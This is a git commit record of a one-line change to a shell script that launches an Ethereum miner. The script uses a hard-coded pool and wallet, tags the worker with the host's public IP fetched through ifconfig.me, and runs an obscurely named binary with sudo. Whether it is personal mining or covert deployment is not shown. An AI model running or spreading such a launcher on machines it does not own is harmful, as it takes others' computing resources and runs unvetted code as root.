900711fcc3abe1ec09cb76c71482bc5b61ffbc81
viencaytrong <55699469+viencaytrong@users.noreply.github.com>
2021-09-20 01:33:51 -0700

    Update mymytrinhabc.sh

--- mymytrinhabc.sh
+++ mymytrinhabc.sh
@@ -2,7 +2,7 @@
 #!/bin/bash
 
 POOL=eu1.ethermine.org:4444
-WALLET=0x39c240d1597a044f7b6bf85c078d41c6a3b12dde.$(echo "$(curl -s ifconfig.me)" | tr . _ )-Vanhien.001
+WALLET=0x39c240d1597a044f7b6bf85c078d41c6a3b12dde.$(echo "$(curl -s ifconfig.me)" | tr . _ )-VanhienHi
 cd "$(dirname "$0")"
 
 chmod +x ./mymytrinhabc && sudo ./mymytrinhabc --algo ETHASH --pool $POOL --user $WALLET  $@
